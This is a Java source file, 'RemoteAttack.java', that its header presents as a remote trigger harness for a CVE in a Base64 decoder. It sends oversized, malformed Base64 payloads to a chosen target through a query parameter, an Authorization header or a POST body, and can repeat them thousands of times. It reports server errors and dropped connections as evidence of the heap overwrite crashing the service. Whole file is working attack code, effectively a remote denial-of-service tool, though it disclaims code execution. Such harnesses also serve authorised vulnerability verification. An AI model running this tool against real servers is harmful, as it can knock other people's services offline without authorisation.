/*
 * RemoteAttack.java - remote trigger harness for CVE-2026-114938 (NOT an RCE chain).
 *
 * What it does: drives a target endpoint with Base64 payloads shaped like the CVE
 * trigger (>128 bytes, length % 4 != 0 so the decoded tail is 1..3 chars) and reports
 * status/latency/connection behaviour per shape, plus whether the target stops
 * answering (the observable sign of the silent heap overwrite turning into a crash).
 *
 * What it cannot do: confirm or achieve code execution. The overwrite is 64 bytes past
 * a byte[] into the JVM heap; turning that into control requires heap grooming inside
 * the target process, which this tool does not perform.
 *
 * Usage:
 *   java RemoteAttack.java --target http://host:port/d --param b --attempts 5000
 *   java RemoteAttack.java --target https://host/path --mode auth
 *   java RemoteAttack.java --target URL --shape control|padded|badtail|all
 */
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import javax.net.ssl.SSLSocketFactory;

public class RemoteAttack {

    private static String shape(char fill, int len, int pad) {
        char[] c = new char[len - pad];
        Arrays.fill(c, fill);
        StringBuilder sb = new StringBuilder(new String(c));
        for (int i = 0; i < pad; i++) {
            sb.append('=');
        }
        return sb.toString();
    }

    public static void main(String[] args) throws Exception {
        String target = null, mode = "query", param = "b", shape = "all";
        int attempts = 1, timeout = 5000;
        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--target" -> target = args[++i];
                case "--mode" -> mode = args[++i];
                case "--param" -> param = args[++i];
                case "--attempts" -> attempts = Integer.parseInt(args[++i]);
                case "--timeout" -> timeout = Integer.parseInt(args[++i]);
                case "--shape" -> shape = args[++i];
                default -> { }
            }
        }
        if (target == null) {
            System.out.println("usage: RemoteAttack --target URL [--mode query|auth|body] "
                    + "[--param b] [--attempts N] [--shape control|padded|badtail|all]");
            return;
        }
        URI uri = URI.create(target);
        boolean tls = "https".equalsIgnoreCase(uri.getScheme());
        String host = uri.getHost();
        int port = uri.getPort() > 0 ? uri.getPort() : (tls ? 443 : 80);
        String path = uri.getRawPath() == null || uri.getRawPath().isEmpty() ? "/" : uri.getRawPath();

        System.out.println("target=" + target + " mode=" + mode + " attempts=" + attempts);
        System.out.println("payloads: control(short) / padded(130, ==) / badtail(130, ==, %4!=0)");
        System.out.println();

        StringBuilder report = new StringBuilder();
        report.append("shape,status,elapsed_ms,note\n");

        if (shape.equals("all") || shape.equals("control")) {
            report.append(run(host, port, tls, path, mode, param,
                    Base64.getEncoder().encodeToString("probe".getBytes()), "control", attempts, timeout));
        }
        if (shape.equals("all") || shape.equals("padded")) {
            report.append(run(host, port, tls, path, mode, param,
                    shape('/', 128, 0) + "==", "padded", attempts, timeout));
        }
        if (shape.equals("all") || shape.equals("badtail")) {
            report.append(run(host, port, tls, path, mode, param,
                    shape('/', 128, 2), "badtail", attempts, timeout));
        }
        System.out.println();
        System.out.print(report);
        System.out.println();
        System.out.println("NOTE: a 5xx / dropped connection under 'badtail' while 'control' stays");
        System.out.println("      healthy is the remote footprint of the heap overwrite (DoS).");
        System.out.println("      No code execution is attempted or implied by this tool.");
    }

    private static String run(String host, int port, boolean tls, String path, String mode,
                              String param, String value, String label, int attempts, int timeout) {
        int ok = 0, s5 = 0, err = 0;
        long t0 = System.nanoTime();
        String lastNote = "";
        for (int i = 0; i < attempts; i++) {
            try {
                Result r = send(host, port, tls, path, mode, param, value, timeout);
                if (r.status >= 500) {
                    s5++;
                } else {
                    ok++;
                }
                lastNote = r.status + " " + r.body;
            } catch (Exception e) {
                err++;
                lastNote = e.getClass().getSimpleName();
            }
        }
        long ms = (System.nanoTime() - t0) / 1_000_000;
        System.out.printf("  %-8s ok=%d 5xx=%d err=%d  (%d ms total, last=%s)%n",
                label, ok, s5, err, ms, lastNote.length() > 40 ? lastNote.substring(0, 40) : lastNote);
        return label + "," + (ok > 0 ? "2xx/4xx" : (s5 > 0 ? "5xx" : "err")) + ","
                + ms + ",\"ok=" + ok + " 5xx=" + s5 + " err=" + err + "\"\n";
    }

    private record Result(int status, String body) { }

    private static Result send(String host, int port, boolean tls, String path, String mode,
                               String param, String value, int timeout) throws Exception {
        Socket raw = new Socket();
        raw.connect(new InetSocketAddress(host, port), timeout);
        Socket s = tls ? ((SSLSocketFactory) SSLSocketFactory.getDefault())
                .createSocket(raw, host, port, true) : raw;
        s.setSoTimeout(timeout);

        String requestLine;
        StringBuilder headers = new StringBuilder();
        byte[] body = new byte[0];
        if (mode.equals("auth")) {
            requestLine = "GET " + path + " HTTP/1.1";
            headers.append("Authorization: Basic ").append(value).append("\r\n");
        } else if (mode.equals("body")) {
            requestLine = "POST " + path + " HTTP/1.1";
            body = (param + "=" + URLEncoder.encode(value, StandardCharsets.UTF_8))
                    .getBytes(StandardCharsets.US_ASCII);
            headers.append("Content-Type: application/x-www-form-urlencoded\r\n");
            headers.append("Content-Length: ").append(body.length).append("\r\n");
        } else {
            requestLine = "GET " + path + "?" + param + "="
                    + URLEncoder.encode(value, StandardCharsets.US_ASCII) + " HTTP/1.1";
        }
        String head = requestLine + "\r\nHost: " + host + "\r\n" + headers
                + "User-Agent: java4shell-remote/1.0\r\nConnection: close\r\n\r\n";
        OutputStream out = s.getOutputStream();
        out.write(head.getBytes(StandardCharsets.US_ASCII));
        if (body.length > 0) {
            out.write(body);
        }
        out.flush();

        InputStream in = s.getInputStream();
        byte[] buf = new byte[4096];
        int n = in.read(buf);
        s.close();
        if (n <= 0) {
            throw new java.io.IOException("empty response");
        }
        String text = new String(buf, 0, n, StandardCharsets.ISO_8859_1);
        int status = Integer.parseInt(text.split(" ")[1]);
        String bodyText = text.contains("\r\n\r\n")
                ? text.substring(text.indexOf("\r\n\r\n") + 4) : "";
        return new Result(status, bodyText.replaceAll("\\s+", " "));
    }
}
